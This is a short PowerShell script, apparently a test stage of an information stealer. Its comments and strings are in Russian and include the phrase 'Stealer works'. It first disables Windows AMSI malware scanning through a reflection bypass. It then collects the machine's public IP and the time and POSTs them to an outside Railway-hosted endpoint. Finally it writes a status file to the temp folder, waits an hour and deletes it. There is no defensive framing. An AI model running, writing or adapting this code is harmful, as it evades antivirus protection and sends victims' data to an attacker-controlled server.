[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$test = @{test="Стиллер работает"; time=(Get-Date); ip=(irm http://api.ipify.org)} | ConvertTo-Json -Compress
try {
    irm "https://serv-production-40e7.up.railway.app/receive" -Method POST -Body $test -ContentType "application/json" -UseBasicParsing
    "Отправка OK" | Out-File "$env:TEMP\stealer_test.txt"
} catch {
    "Ошибка: $_" | Out-File "$env:TEMP\stealer_test.txt"
}
Start-Sleep -Seconds 3600
Remove-Item "$env:TEMP\stealer_test.txt" -Force
